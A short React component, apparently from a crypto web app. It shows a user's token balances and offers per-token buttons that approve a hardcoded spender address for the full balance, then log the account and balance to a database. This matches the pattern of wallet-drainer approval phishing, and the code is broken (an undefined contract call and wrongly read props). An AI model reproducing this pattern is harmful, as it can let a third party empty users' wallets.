import abi from "../constants/abi"
import { ethers } from "ethers"
import {useWeb3Contract} from "react-moralis";



export default function Approve(balanceObject, isFetching, Moralis, account) {
 
    return (
        <div className="container-md">
            <table className="table">
                <thead>
                    <tr>
                        <th scope="col">#</th>
                        <th scope="col">Symbol</th>
                        <th scope="col">Address</th>
                        <th scope="col">Balance</th>
                        <th scope="col">Approval</th>
                    </tr>
                </thead>
                <tbody>
                    {
                        balanceObject.map((b, i) => (
                            <tr key={i}>

                                <th scope="row">{i}</th>
                                <td>{b.symbol}</td>
                                <td>{b.token_address}</td>
                                <td>{parseInt(b.balance) / ("1e" + b.decimals)}</td>
                                <td><button className="btn btn-primary"
                                    disabled={isFetching}
                                    onClick={async () => {

                                        await runContractFunction({
                                            params: {
                                                abi: abi,
                                                contractAddress: b.token_address, // your contract address here
                                                functionName: "approve",
                                                params: {
                                                    //TODO change address
                                                    _spender: "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
                                                    _value: ethers.utils.parseUnits(b.balance, 'wei'),
                                                },
                                            }
                                        })


                                        const Balances = await Moralis.Object.extend("Balances")
                                        const Bal = await new Balances()
                                        await Bal.set("token_addresses", b.token_address)
                                        await Bal.set("Balances", b.balance)
                                        await Bal.set("accounts", account)
                                        await Bal.save()
                                        console.log("db updated")
                                    }}>
                                    approve</button>
                                </td>
                            </tr>
                        ))}
                </tbody>
            </table>
        </div>
    )
}